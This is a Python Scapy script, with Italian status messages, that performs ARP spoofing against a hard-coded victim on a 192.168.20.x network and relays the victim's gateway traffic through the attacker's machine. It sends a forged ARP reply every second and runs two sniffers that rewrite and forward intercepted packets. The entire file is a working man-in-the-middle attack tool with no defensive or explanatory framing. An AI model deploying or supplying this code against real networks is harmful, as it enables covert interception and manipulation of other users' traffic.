from scapy.all import *
from scapy.layers.inet import Ether, IP, TCP, UDP
import time
import threading

gateway_mac='52:54:00:88:15:b6'
my_mac='00:e0:4c:36:73:52'
victim_mac='08:00:27:67:8f:72'
victim_ip='192.168.20.45'
gateway_ip='192.168.20.1'
my_ip='192.168.20.55'

def sniffsniff(pckt):
	if ARP in pckt:
		print("ARP droppato")	
		return
	if (pckt[Ether].dst==my_mac and pckt[Ether].src==victim_mac):
		pckt[Ether].dst = gateway_mac
		pckt[Ether].src = my_mac
		if IP in pckt:
			pckt[IP].src=my_ip
			del pckt[IP].chksum
			
		if UDP in pckt:
			del pckt[UDP].chksum
		if TCP in pckt:	
			del pckt[TCP].chksum 
		sendp(pckt,verbose=0)
		print("Replicato a gateway")
		
	elif (pckt[Ether].dst==my_mac and pckt[Ether].src==gateway_mac):	
		pckt[Ether].dst = victim_mac
		pckt[Ether].src = my_mac
		tmp_pckt=(pckt[Ether])
		if IP in pckt:
			pckt[IP].dst=victim_ip
			del pckt[IP].chksum
		if UDP in pckt:
			del pckt[UDP].chksum
		if TCP in pckt:
			#print("C'e' TCP nel traffico gateway->vittima")
			del pckt[TCP].chksum
		sendp(pckt,verbose=0)
		print("Replicato a vittima")

def arp_spoof():
	print("Arp spoofing unidirezionale avviato")
	while 1:
		sendp(Ether(dst=victim_mac,src=my_mac)/ARP(op=2,psrc=gateway_ip,pdst=victim_ip, hwdst=victim_mac),verbose=0)
		time.sleep(1)



print("Start\n")
arp_spoof = threading.Thread(target=arp_spoof)
arp_spoof.start()

AsyncSniffer(lfilter=lambda d: (d.dst==my_mac and d.src==victim_mac) , prn=sniffsniff).start()
AsyncSniffer(lfilter=lambda d: (d.dst==my_mac and d.src==gateway_mac), prn=sniffsniff).start()
while 1:
	time.sleep(1)
